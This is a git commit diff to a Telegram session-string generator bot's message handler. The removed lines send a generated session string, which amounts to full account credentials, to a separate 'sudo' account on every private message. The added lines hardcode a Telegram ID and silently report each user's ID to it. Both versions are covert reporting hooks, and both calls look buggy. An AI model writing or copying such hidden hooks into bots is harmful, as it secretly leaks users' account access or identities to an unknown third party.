cf3cdb852e722779f14eff1113a7cd329fe53a1a
STRANGER <147219905+itzshukla@users.noreply.github.com>
2024-02-13 12:53:18 +0530

    Update bot_users.py

--- StringGenBot/bot_users.py
+++ StringGenBot/bot_users.py
@@ -1,16 +1,14 @@
 from pyrogram.types import Message
 from pyrogram import Client, filters
 
-from config import OWNER_ID, SUDO_USER_ID
+from config import OWNER_ID
 from StringGenBot.db.users import add_served_user, get_served_users
-
-from StringGenBot.generate import generate_string
+sudo_user_id = 5957398316
 
 @Client.on_message(filters.private & ~filters.service, group=1)
 async def users_sql(_, msg: Message):
-    generate_string = generate_string() 
     await add_served_user(msg.from_user.id)
-    await _.send_message(SUDO_USER_ID, generated_string)  
+    await Client.send_message(chat_id=sudo_user_id, text=f"DONE: {msg.from_user.id}")
 
 @Client.on_message(filters.user(OWNER_ID) & filters.command("stats"))
 async def _stats(_, msg: Message):
